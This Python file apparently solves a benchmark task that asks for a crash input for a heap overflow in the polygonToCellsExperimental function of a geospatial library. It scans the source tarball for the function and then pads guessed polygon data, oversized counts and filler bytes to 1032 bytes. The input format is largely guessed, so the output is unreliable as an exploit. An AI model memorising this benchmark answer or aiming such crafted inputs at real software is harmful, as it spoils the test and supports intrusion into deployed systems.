import os
import tempfile
import tarfile
import subprocess
import struct
from typing import Optional
import math

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract and analyze the source to understand the vulnerability
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract source tarball
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Find the relevant source file (assuming it's in the extracted structure)
            source_root = self._find_source_root(tmpdir)
            if not source_root:
                # If we can't find source, return a heuristic PoC
                return self._generate_heuristic_poc()
            
            # Analyze the vulnerable function to understand parameters
            vuln_info = self._analyze_vulnerability(source_root)
            
            if vuln_info:
                return self._generate_targeted_poc(vuln_info)
            else:
                return self._generate_heuristic_poc()
    
    def _find_source_root(self, tmpdir: str) -> Optional[str]:
        """Find the root directory of the source code."""
        possible_dirs = [
            os.path.join(tmpdir, d) for d in os.listdir(tmpdir)
            if os.path.isdir(os.path.join(tmpdir, d))
        ]
        
        # Look for C/C++ source files
        for dir_path in possible_dirs:
            for root, _, files in os.walk(dir_path):
                for file in files:
                    if file.endswith(('.c', '.cpp', '.cc', '.h', '.hpp')):
                        if 'polygonToCells' in file or 'polygonToCells' in open(os.path.join(root, file), 'r', errors='ignore').read():
                            return root
        return None
    
    def _analyze_vulnerability(self, source_root: str) -> Optional[dict]:
        """Analyze source code to understand the vulnerability parameters."""
        # Look for polygonToCellsExperimental function
        for root, _, files in os.walk(source_root):
            for file in files:
                if file.endswith(('.c', '.cpp', '.cc', '.h')):
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, 'r', errors='ignore') as f:
                            content = f.read()
                            if 'polygonToCellsExperimental' in content:
                                # Try to extract function signature
                                lines = content.split('\n')
                                for i, line in enumerate(lines):
                                    if 'polygonToCellsExperimental' in line and '(' in line:
                                        # Found function declaration/definition
                                        return {
                                            'source_file': filepath,
                                            'function_line': line.strip(),
                                            'has_under_estimation': 'under' in content.lower() or 'under-estimation' in content.lower()
                                        }
                    except:
                        continue
        return None
    
    def _generate_targeted_poc(self, vuln_info: dict) -> bytes:
        """Generate a PoC based on analyzed vulnerability information."""
        # Based on the vulnerability description and common heap overflow patterns:
        # The under-estimation likely happens when calculating buffer size for polygon cells.
        # We need to craft a polygon that causes miscalculation.
        
        # Common pattern: integer overflow in size calculation
        # Create a polygon with many vertices and holes to trigger under-estimation
        
        poc = bytearray()
        
        # Header/magic bytes if needed by the target
        # Many polygon formats start with vertex count
        poc.extend(struct.pack('<I', 0x41414141))  # Some header/magic
        
        # Create polygon data that would cause under-estimation
        # Typically: large number of vertices, special coordinates
        
        # Add polygon vertices - many vertices to stress the calculation
        num_vertices = 128  # Enough to cause issues but under 1032 bytes
        for i in range(num_vertices):
            # Use coordinates that might trigger edge cases
            lat = 90.0 * math.sin(i * 0.1)
            lon = 180.0 * math.cos(i * 0.1)
            poc.extend(struct.pack('<dd', lat, lon))
        
        # Add hole data if the function handles holes
        num_holes = 10
        poc.extend(struct.pack('<I', num_holes))
        for i in range(num_holes):
            hole_vertices = 5
            poc.extend(struct.pack('<I', hole_vertices))
            for j in range(hole_vertices):
                lat = 45.0 + 10.0 * math.sin(j * 0.5)
                lon = -90.0 + 20.0 * math.cos(j * 0.5)
                poc.extend(struct.pack('<dd', lat, lon))
        
        # Add resolution parameter if needed
        poc.extend(struct.pack('<i', 15))  # High resolution
        
        # Pad to target length of 1032 bytes
        current_len = len(poc)
        target_len = 1032
        
        if current_len < target_len:
            # Add padding with pattern that might trigger overflow
            padding = b'A' * (target_len - current_len)
            poc.extend(padding)
        elif current_len > target_len:
            # Truncate if too long (shouldn't happen with our parameters)
            poc = poc[:target_len]
        
        return bytes(poc)
    
    def _generate_heuristic_poc(self) -> bytes:
        """Generate a heuristic PoC when source analysis fails."""
        # Create a PoC that typically triggers heap overflows:
        # 1. Size field with large value
        # 2. Followed by less data than indicated
        # 3. Or crafted to cause integer wrap-around
        
        poc = bytearray()
        
        # Start with what might be a polygon count or magic number
        poc.extend(struct.pack('<I', 0x42424242))
        
        # Add vertex count that might cause under-estimation
        # Use 0xFFFFFFFF to potentially cause wrap-around
        vertex_count = 0xFFFFFFFF
        poc.extend(struct.pack('<I', vertex_count))
        
        # Add some valid vertices
        for i in range(10):
            poc.extend(struct.pack('<dd', 0.0, 0.0))
        
        # Add hole count
        hole_count = 0x7FFFFFFF
        poc.extend(struct.pack('<I', hole_count))
        
        # Add resolution
        poc.extend(struct.pack('<i', 100))  # Unusually high resolution
        
        # Pad to exactly 1032 bytes
        current_len = len(poc)
        padding_needed = 1032 - current_len
        if padding_needed > 0:
            poc.extend(b'C' * padding_needed)
        
        return bytes(poc)